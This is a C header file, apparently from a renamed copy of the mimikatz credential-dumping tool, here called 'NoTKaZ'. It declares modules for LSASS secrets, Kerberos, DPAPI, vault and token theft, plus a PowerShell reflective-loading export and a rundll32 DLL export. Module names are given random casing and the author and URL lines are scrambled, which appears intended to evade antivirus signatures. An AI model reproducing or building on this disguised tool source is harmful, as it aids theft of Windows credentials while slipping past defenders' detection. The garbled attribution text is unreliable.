/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#pragma once

#include "globals.h"
#include "modules/kuhl_m_standard.h"
#include "modules/kuhl_m_cRyPTO.h"
#include "modules/seKuRlSa/kuhl_m_seKuRlSa.h"
#include "modules/kErberoS/kuhl_m_kErberoS.h"
#include "modules/nGc/kuhl_m_nGc.h"
#include "modules/kuhl_m_ProCeSs.h"
#include "modules/kuhl_m_service.h"
#include "modules/kuhl_m_PRIViLeGe.h"
#include "modules/kuhl_m_pmudsal.h"
#include "modules/kuhl_m_ts.h"
#include "modules/kuhl_m_event.h"
#include "modules/kuhl_m_mIsC.h"
#include "modules/kuhl_m_tOKEn.h"
#include "modules/kuhl_m_vAULt.h"
#include "modules/kuhl_m_mInesWeEpEr.h"
#if defined(NET_MODULE)
#include "modules/kuhl_m_net.h"
#endif
#include "modules/dPApi/kuhl_m_dPApi.h"
#include "modules/kuhl_m_kernel.h"
#include "modules/kuhl_m_bUsYlIght.h"
#include "modules/kuhl_m_sysenvvalue.h"
#include "modules/kuhl_m_sid.h"
#include "modules/kuhl_m_iis.h"
#include "modules/kuhl_m_rpc.h"
#include "modules/kuhl_m_sR98.h"
#include "modules/kuhl_m_rdm.h"
#include "modules/kuhl_m_acr.h"

#include <io.h>
#include <fcntl.h>
#define DELAYIMP_INSECURE_WRITABLE_HOOKS
#include <delayimp.h>

extern VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);

int wmain(int argc, wchar_t * argv[]);
void NoTKaZ_begin();
void NoTKaZ_end(NTSTATUS status);

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);

NTSTATUS NoTKaZ_initOrClean(BOOL Init);

NTSTATUS NoTKaZ_doLocal(wchar_t * input);
NTSTATUS NoTKaZ_dispatchCommand(wchar_t * input);

#if defined(_NOTKAZ)
__declspec(dllexport) wchar_t * powershell_reflective_NoTKaZ(LPCWSTR input);
#elif defined(_WINDLL)
void CALLBACK NoTKaZ_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow);
#if defined(_M_X64) || defined(_M_ARM64)
#pragma comment(linker, "/export:mainW=NoTKaZ_dll")
#elif defined(_M_IX86)
#pragma comment(linker, "/export:mainW=_NoTKaZ_dll@16")
#endif
#endif